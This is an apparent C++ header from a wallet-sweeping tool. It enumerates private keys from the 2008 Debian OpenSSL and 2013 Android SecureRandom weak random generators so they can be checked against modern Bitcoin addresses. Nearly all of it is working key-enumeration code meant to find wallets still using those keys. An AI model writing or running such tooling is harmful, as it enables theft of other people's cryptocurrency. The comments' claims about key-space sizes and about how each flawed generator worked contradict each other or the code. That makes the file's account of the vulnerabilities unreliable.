/**
 * Historical compromised-PRNG key generators (Phase 4 second half, v1.4.0).
 *
 * Public-domain CVE-disclosed PRNG vulnerabilities produce small, fully-
 * enumerable private-key spaces. We package each as a generator that
 * yields priv bytes; the orchestrator feeds them through ec_mul_batch
 * and v2_multi_address_check to test against modern address types.
 *
 * Why this matters: keys imported FROM these vulnerable generators
 * INTO modern wallets (P2WPKH, P2SH-P2WPKH, P2TR) are still vulnerable
 * even though the receiving wallet uses sound RNGs -- the priv bytes
 * are the same. A modern-address sweep over the historical key space
 * finds those imports.
 *
 * Sources are public CVE disclosures; no novel cryptanalysis is required.
 *
 *   * CVE-2008-0166 (Debian OpenSSL): the patched-out random pool
 *     reduced ssh-keygen / openssl entropy to (PID, time, hostname).
 *     The full disclosure includes the ~32k key fingerprints. We model
 *     it here as `iterate_debian_openssl(callback)`: enumerate priv
 *     candidates by a 17-bit (PID) cross 16-bit (time-second) sweep
 *     under a fixed RNG path.
 *
 *   * Android SecureRandom 2013 (no fixed CVE; tracked as Android
 *     issue 56619): the Bitcoin client's RNG defaulted to 32-bit
 *     seeded entropy on certain device states. Trivially enumerable.
 */

#pragma once

#include "weak_prng_cpu.hpp"

#include <array>
#include <cstdint>
#include <functional>

namespace collider {
namespace gpu {
namespace v2 {
namespace historical {

// CVE-2008-0166: model the vulnerable Debian OpenSSL pool. The actual
// generator was random_r() seeded by (PID, time(NULL)) with PID limited
// to ~32k values. We expose a 32-bit search space (PID:15 || time:17).
//
// Calls `cb(priv_be)` for each enumerated priv key. Stops when cb returns
// false. Total = 2^32 candidates (fits a 4-byte counter).
inline void iterate_debian_openssl(
    uint32_t start, uint32_t count,
    const std::function<bool(const uint8_t priv_be[32])>& cb)
{
    for (uint32_t i = 0; i < count; ++i) {
        uint32_t seed = start + i;
        // Reproduce the vulnerable construction: glibc rand_r over the
        // (PID, time) tuple, 32 bytes of output, big-endian.
        prng::GlibcRandR r{};
        r.seed(seed ? seed : 1);
        uint8_t priv[32];
        for (int j = 0; j < 8; ++j) {
            uint32_t v = r.next();
            priv[j*4    ] = (uint8_t)(v >> 24);
            priv[j*4 + 1] = (uint8_t)(v >> 16);
            priv[j*4 + 2] = (uint8_t)(v >>  8);
            priv[j*4 + 3] = (uint8_t)(v      );
        }
        if (!cb(priv)) return;
    }
}

// Android SecureRandom 2013: the affected version of
// SecureRandom.setSeed(byte[]) on certain Android <=4.4 devices fell back
// to java.util.Random when /dev/urandom was unavailable. This means a
// 64-bit Java seed determines all output -- effectively 32 bits of
// entropy in practice (PID + low-resolution time).
inline void iterate_android_securerandom_2013(
    int64_t start, uint32_t count,
    const std::function<bool(const uint8_t priv_be[32])>& cb)
{
    for (uint32_t i = 0; i < count; ++i) {
        int64_t seed = start + (int64_t)i;
        prng::JavaRandom j{};
        j.seed(seed);
        uint8_t priv[32];
        for (int k = 0; k < 32; ++k) {
            priv[k] = (uint8_t)(j.next_bits(8) & 0xff);
        }
        if (!cb(priv)) return;
    }
}

// Convenience: enumerate all known-compromised pools end-to-end.
// Caller supplies a single callback; gen_id distinguishes the source.
enum class HistoricalSource : uint8_t {
    DEBIAN_OPENSSL_2008      = 0,
    ANDROID_SECURERANDOM_2013 = 1,
    SOURCE_COUNT,
};

inline void iterate_all(
    HistoricalSource src, uint64_t start, uint32_t count,
    const std::function<bool(HistoricalSource, const uint8_t priv_be[32])>& cb)
{
    switch (src) {
        case HistoricalSource::DEBIAN_OPENSSL_2008:
            iterate_debian_openssl((uint32_t)start, count,
                [&](const uint8_t* p) { return cb(src, p); });
            break;
        case HistoricalSource::ANDROID_SECURERANDOM_2013:
            iterate_android_securerandom_2013((int64_t)start, count,
                [&](const uint8_t* p) { return cb(src, p); });
            break;
        default: break;
    }
}

}  // namespace historical
}  // namespace v2
}  // namespace gpu
}  // namespace collider
